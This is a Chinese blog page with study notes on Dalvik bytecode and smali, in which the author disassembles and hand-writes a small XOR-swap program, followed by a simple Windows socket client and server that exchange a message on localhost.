<p><a target="_blank" rel="noopener" href="https://developer.android.com/reference/dalvik/bytecode/Opcodes.html">Opcodes  | Android Developers</a></p>
<p>可以看到Dalvik指令后面，都是用寄存器保存返回值，对寄存器进行频繁操作，而Jvm是对栈进行频繁操作。</p>
<p>实现相同的功能其，相比于Jvm，Dalvik所用到的指令更少，自然也更简洁。</p>
<p>我们将刚得到的dex文件用baksmali编译为smali文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar baksmali.jar d math.dex</span><br><span class="line">java -jar smali.jar a -o math1.dex math.smali(这个是把smali转为dex)</span><br></pre></td></tr></table></figure>

<p>只需要把baksmali和smali的jar包放在SDK的tools目录下，然后切换到该目录下执行命令就可以编译出smali文件了(默认在执行后生成的output文件夹里)。(注意以上过程都需要在同一个jdk版本的前提下进行，否则会出现一些错误)</p>
<p>记事本打开生成的smali文件（这里我是用IDEA的插件(java2smali)直接生成的,跟上面那张图不一样，上面是用的另一台电脑的java8编译出来的，下面这个是java18的结果）</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lmath;</span></span><br><span class="line"><span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span></span><br><span class="line"><span class="keyword">.source</span> <span class="string">&quot;math.java&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># direct methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .registers</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 1</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> main([<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"><span class="keyword">    .registers</span> 5</span><br><span class="line"><span class="keyword">    .param</span> p0, <span class="string">&quot;args&quot;</span>    <span class="comment"># [Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 3</span><br><span class="line">   <span class="built_in"> const/4 </span>v0, 0x5</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">&quot;a&quot;</span>:I</span><br><span class="line">   <span class="built_in"> const/4 </span>v1, 0x3</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .local</span> v1, <span class="string">&quot;b&quot;</span>:I</span><br><span class="line">   <span class="built_in"> xor-int </span>v2, v0, v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 4</span><br><span class="line"><span class="keyword">    .local</span> v2, <span class="string">&quot;c&quot;</span>:I</span><br><span class="line">   <span class="built_in"> xor-int/lit8 </span>v0, v0, 0x6</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 5</span><br><span class="line">   <span class="built_in"> xor-int/lit8 </span>v1, v1, 0x6</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 6</span><br><span class="line">   <span class="built_in"> sget-object </span>v3, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v3, v0&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(I)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 7</span><br><span class="line">   <span class="built_in"> sget-object </span>v3, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v3, v1&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(I)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 8</span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>

<p>上面 Ljava&#x2F;lang&#x2F;System;-&gt;out:Ljava&#x2F;io&#x2F;PrintStream 表示Java中的System类的out字段的PrintStream字段类型</p>
<p>这里因为我baksmali和smali版本(都是2.5.2)的原因，指令会跟老版本不一样，老版本可能是这样的</p>
<img src="/2022/06/30/Dalvik-smali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220629211611482.png" class="" title="image-20220629211611482">



<p>再贴一张Dalvik的两种寄存器命名法</p>
<img src="/2022/06/30/Dalvik-smali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220630095915424.png" class="" title="image-20220630095915424">

<p>对于有M个寄存器，N个参数的函数来说</p>
<p>在P命名法中p0是参数寄存器，v0是变量寄存器</p>
<p>在V命名法中，局部变量寄存器是v0–vn 参数寄存器则为vn–v(n+m)</p>
<p>（在Dalvik汇编代码较长的，且使用寄存器较多的时候，P命名法可以更清楚的阅读代码。）</p>
<p>对于math的代码来说，参数寄存器就是用来存放参数的，即存储println引用的字段，即被交换值过后的a (&#x3D;3)。v0则是用来存放变量值3，5。</p>
<h2 id="Smali简单编写尝试"><a href="#Smali简单编写尝试" class="headerlink" title="Smali简单编写尝试"></a>Smali简单编写尝试</h2><p>首先说下，有些指令助记符后添加了jumbo后缀，这是在 Android 4.0 开始的扩展指令，增加了寄存器和指令索引的取值范围。另外，除去加了jumbo后缀的扩展指令，每个指令的字节码只占1字节范围是0x0~0xff。</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lmath;</span></span><br><span class="line"><span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line">	.prologue	</span><br><span class="line">	.registers 1</span><br><span class="line"><span class="built_in">	invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"><span class="built_in">	return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> main([<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line">	.registers 4</span><br><span class="line">	</span><br><span class="line"><span class="built_in">	const </span>v0, 0x5</span><br><span class="line"><span class="built_in">	const </span>v1, 0x3</span><br><span class="line"><span class="built_in">	const </span>v2,0x0	</span><br><span class="line"><span class="built_in">	xor-int </span>v2 ,v0,v1</span><br><span class="line">	</span><br><span class="line"><span class="built_in">	sget-object </span>p0, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span>  </span><br><span class="line"><span class="built_in">	xor-int </span>v0, v0, v2</span><br><span class="line"><span class="built_in">	invoke-virtual </span>&#123;p0,v0&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(I)V</span><br><span class="line">	</span><br><span class="line"><span class="built_in">	sget-object </span>p0, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span></span><br><span class="line"><span class="built_in">	xor-int </span>v1, v1, v2</span><br><span class="line"><span class="built_in">	invoke-virtual </span>&#123;p0,v1&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(I)V</span><br><span class="line"><span class="built_in">	return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>

<p>我们用上面将smali转化为dex的命令，将其转化为math2.dex，再用d2jdex将dex转化为jar包</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar math2.dex</span><br></pre></td></tr></table></figure>

<p>然后用jd-gui打开生成的jar包，查看代码</p>
<img src="/2022/06/30/Dalvik-smali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220701100839722.png" class="" title="image-20220701100839722">

<p>可以看到虽然长相不同，但其实现的功能与原来的math还是差不多的。(雾)</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2022/05/20/socket%E7%BC%96%E7%A8%8B%E5%B0%9D%E8%AF%95%EF%BC%88Windows%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/20/socket%E7%BC%96%E7%A8%8B%E5%B0%9D%E8%AF%95%EF%BC%88Windows%EF%BC%89/" class="post-title-link" itemprop="url">socket编程尝试（Windows）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-20 09:43:45" itemprop="dateCreated datePublished" datetime="2022-05-20T09:43:45+08:00">2022-05-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-14 23:23:22" itemprop="dateModified" datetime="2025-10-14T23:23:22+08:00">2025-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="socket编程尝试（Windows）"><a href="#socket编程尝试（Windows）" class="headerlink" title="socket编程尝试（Windows）"></a>socket编程尝试（Windows）</h1><p>首先是对于socket这一技术，贴一篇文章</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/066d99da7cbd">socket技术详解</a></p>
<p>用一张图概括整个过程（linux下的，与windows不同之处在于函数名和一些细小差别）</p>
<img src="/2022/05/20/socket%E7%BC%96%E7%A8%8B%E5%B0%9D%E8%AF%95%EF%BC%88Windows%EF%BC%89/image-20220520081743268.png" class="" title="image-20220520081743268">

<p>针对详细过程，请参阅上述文章，此处不再赘述</p>
<p>我们着重讲编程部分。</p>
<p>首先是客户端</p>
<h2 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>) <span class="comment">//表示链接Ws2_32.lib这个库。   </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xPort 8000 <span class="comment">//端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xIP <span class="string">&quot;127.0.0.1&quot;</span> <span class="comment">// ip</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> xBUF_SIZE = <span class="number">64</span>;</span><br><span class="line">    WSADATA         wsd;                <span class="comment">//WSADATA变量</span></span><br><span class="line">    SOCKET          xServer;            <span class="comment">//服务器套接字</span></span><br><span class="line">    SOCKET          xClient;            <span class="comment">//客户端套接字</span></span><br><span class="line">    <span class="type">char</span>            input[xBUF_SIZE];  <span class="comment">//接受数据缓冲区</span></span><br><span class="line">    <span class="type">char</span>            str[xBUF_SIZE]; <span class="comment">//返回数据缓冲区</span></span><br><span class="line">    <span class="type">int</span>             retVal;             <span class="comment">//返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsd) != <span class="number">0</span>) <span class="comment">//初始化</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;WSAStartup failed!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xClient = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP); <span class="comment">//创建一个socket</span></span><br><span class="line">    <span class="keyword">if</span> (INVALID_SOCKET == xClient)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;socket failed!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> sockAddr;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;sockAddr, <span class="number">0</span>, <span class="built_in">sizeof</span>(sockAddr));  <span class="comment">//每个字节都用0填充</span></span><br><span class="line">    sockAddr.sin_family = PF_INET;</span><br><span class="line">    sockAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    sockAddr.sin_port = <span class="built_in">htons</span>(<span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line">    retVal = <span class="built_in">connect</span>(xClient, (LPSOCKADDR)&amp;sockAddr, <span class="built_in">sizeof</span>(sockAddr)); <span class="comment">//连接</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == retVal)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;connect failed!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">closesocket</span>(xClient);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//客户端初始化完成</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(input, <span class="number">0</span>, xBUF_SIZE);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Input:&quot;</span> ;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,input);</span><br><span class="line">        retVal = <span class="built_in">send</span>(xClient, input, xBUF_SIZE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">recv</span>(xClient, str, xBUF_SIZE, <span class="number">0</span>);</span><br><span class="line">        cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">closesocket</span>(xClient);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>上述sockaddr_in的结构体定义如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> &#123;</span><br><span class="line"></span><br><span class="line">　　<span class="type">short</span> <span class="type">int</span> sin_family; <span class="comment">/* 通信类型 */</span></span><br><span class="line"></span><br><span class="line">　　<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> sin_port; <span class="comment">/* 端口 */</span></span><br><span class="line"></span><br><span class="line">　　<span class="keyword">struct</span> <span class="title class_">in_addr</span> sin_addr; <span class="comment">/* Internet 地址 */</span></span><br><span class="line"></span><br><span class="line">　　<span class="type">unsigned</span> <span class="type">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">/* 与sockaddr结构的长度相同*/</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xPort 8000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xIP <span class="string">&quot;127.0.0.1&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> xBUF_SIZE = <span class="number">64</span>;</span><br><span class="line">    WSADATA         wsd;                <span class="comment">//WSADATA变量</span></span><br><span class="line">    SOCKET          xServer;            <span class="comment">//服务器套接字</span></span><br><span class="line">    SOCKET          xClient;            <span class="comment">//客户端套接字</span></span><br><span class="line">    SOCKADDR_IN     xaddrServ;</span><br><span class="line">    <span class="type">char</span>            string[xBUF_SIZE];  <span class="comment">//接受数据缓冲区</span></span><br><span class="line">    <span class="type">char</span>            sendinput[xBUF_SIZE]; <span class="comment">//返回数据缓冲区</span></span><br><span class="line">    <span class="type">int</span>             retVal;             <span class="comment">//返回值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsd) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;WSAStartup failed!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建一个socket</span></span><br><span class="line">    xServer = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (INVALID_SOCKET == xServer)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;socket failed&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//服务器socket地址</span></span><br><span class="line">    xaddrServ.sin_family = AF_INET;</span><br><span class="line">    xaddrServ.sin_port = <span class="built_in">htons</span>(xPort);</span><br><span class="line">    xaddrServ.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定socket</span></span><br><span class="line">    retVal = <span class="built_in">bind</span>(xServer, (SOCKADDR*)&amp;xaddrServ, <span class="built_in">sizeof</span>(SOCKADDR_IN));</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == retVal)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;bind failed&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">closesocket</span>(xServer);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    retVal = <span class="built_in">listen</span>(xServer, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == retVal)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;listen failed&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">closesocket</span>(xServer);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sockaddr_in addrClient;</span><br><span class="line">    <span class="type">int</span> addrClientLen = <span class="built_in">sizeof</span>(addrClient);</span><br><span class="line">    xClient = <span class="built_in">accept</span>(xServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientLen);<span class="comment">//创建一个等待链接的客户端socket</span></span><br><span class="line">    <span class="keyword">if</span> (INVALID_SOCKET == xClient)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;accept failed&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">closesocket</span>(xServer);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化完成</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(sendinput, <span class="number">0</span>, xBUF_SIZE);</span><br><span class="line">        <span class="built_in">recv</span>(xClient,sendinput,xBUF_SIZE,<span class="number">0</span>);</span><br><span class="line">        cout &lt;&lt; sendinput;</span><br><span class="line">        <span class="built_in">memset</span>(string,<span class="number">0</span>,xBUF_SIZE);</span><br><span class="line">        <span class="built_in">strcpy</span>(string, <span class="string">&quot;good :)&quot;</span>);</span><br><span class="line">        <span class="built_in">send</span>(xClient,string,xBUF_SIZE,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">closesocket</span>(xServer);</span><br><span class="line">    <span class="built_in">closesocket</span>(xClient);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原本想在服务端加一个RC4加密的，结果有一些问题，也不太想改，就让客户端输入，服务端返回一个字符串了。</p>
<p>这只是单线程的socket编程。</p>
<p>参考文章</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kefeiGame/p/7246942.html">https://www.cnblogs.com/kefeiGame/p/7246942.html</a></p>
